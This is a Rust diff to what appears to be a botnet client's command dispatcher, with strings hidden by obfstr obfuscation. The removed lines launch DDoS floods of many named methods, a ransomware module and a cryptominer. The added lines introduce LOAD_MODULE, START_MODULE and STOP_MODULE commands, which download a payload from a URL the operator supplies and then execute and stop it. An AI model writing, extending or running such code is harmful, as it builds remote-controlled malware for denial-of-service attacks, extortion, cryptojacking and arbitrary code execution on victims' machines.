@@ -482,53 +482,47 @@ fn process_command(cmd: &CommandPayload) {
     println!("{}: {} [{}]", obfstr!("EXECUTING"), cmd.action, cmd.id);
 
     match cmd.action.as_str() {
-        "DDOS_L4" | "DDOS_L7" => {
-            // Format: TARGET|PORT|DURATION|METHOD
-            // Example: 1.1.1.1|80|60|UDP_RANDOM
+        "LOAD_MODULE" => {
+            // Format: URL|NAME
             let parts: Vec<&str> = cmd.parameters.split('|').collect();
-            if parts.len() >= 4 {
-                let target = parts[0];
-                let port = parts[1].parse::<u16>().unwrap_or(80);
-                let duration = parts[2].parse::<u64>().unwrap_or(60);
-                let method_str = parts[3];
+            if parts.len() >= 2 {
+                let url = parts[0];
+                let name = parts[1];
+                let url_owned = url.to_string();
+                let name_owned = name.to_string();
                 
-                let method = match method_str {
-                    "UDP_RANDOM" => crate::modules::ddos::AttackMethod::UdpRandom,
-                    "UDP_FRAG" => crate::modules::ddos::AttackMethod::UdpFragmentation,
-                    "TCP_CONN" => crate::modules::ddos::AttackMethod::TcpConnection,
-                    "TCP_SYN" => crate::modules::ddos::AttackMethod::TcpSyn,
-                    "TCP_ACK" => crate::modules::ddos::AttackMethod::TcpAckPsh,
-                    "PPS" => crate::modules::ddos::AttackMethod::HighPps,
-                    "HTTP_FLOOD" => crate::modules::ddos::AttackMethod::HttpFlood,
-                    "HTTP_RECURSIVE" => crate::modules::ddos::AttackMethod::HttpRecursive,
-                    "HTTP_SLOW" => crate::modules::ddos::AttackMethod::HttpSlowloris,
-                    "HTTP_RUDY" => crate::modules::ddos::AttackMethod::HttpRudy,
-                    "HTTP2" => crate::modules::ddos::AttackMethod::Http2Continuation,
-                    _ => crate::modules::ddos::AttackMethod::UdpRandom,
-                };
-                
-                println!("{}: {} -> {}", obfstr!("Launching DDoS"), method_str, target);
-                let target_owned = target.to_string();
                 tokio::spawn(async move {
-                    crate::modules::ddos::start_attack(method, &target_owned, port, duration).await;
+                    match crate::modules::loader::download_payload(&url_owned, &name_owned).await {
+                         Ok(path) => println!("Module Loaded: {}", path.display()),
+                         Err(e) => eprintln!("Load Failed: {}", e),
+                    }
                 });
             }
         },
-        "RANSOMWARE" => {
-            println!("{}", obfstr!("Activating Ransomware Module..."));
-            std::thread::spawn(|| {
-                crate::modules::ransomware::start_ransomware();
-            });
+        "START_MODULE" => {
+            // Format: NAME|ARGS
+            let parts: Vec<&str> = cmd.parameters.split('|').collect();
+            if parts.len() >= 1 {
+                let name = parts[0];
+                let args = if parts.len() > 1 { parts[1] } else { "" };
+                
+                match crate::modules::loader::execute_payload(name, args) {
+                    Ok(pid) => println!("Module Started. PID: {}", pid),
+                    Err(e) => eprintln!("Start Failed: {}", e),
+                }
+            }
         },
-        "START_MINER" => {
-             println!("{}", obfstr!("Starting Miner Supervisor..."));
-             tokio::spawn(async {
-                 crate::modules::miner::miner_supervisor().await;
-             });
-        },
-        "STOP_MINER" => {
-             println!("{}", obfstr!("Stopping Miner..."));
-             let _ = crate::modules::miner::stop_mining();
+        "STOP_MODULE" => {
+             let name = cmd.parameters.trim();
+             println!("{}: {}", obfstr!("Stopping Module"), name);
+             if !name.is_empty() {
+                 let name_owned = name.to_string();
+                 tokio::spawn(async move {
+                     if let Err(e) = crate::modules::loader::stop_payload(&name_owned) {
+                         eprintln!("Stop Failed: {}", e);
+                     }
+                 });
+             }
         },
         "KILL_BOT" => {
             println!("{}", obfstr!("Received KILL command. Exiting."));
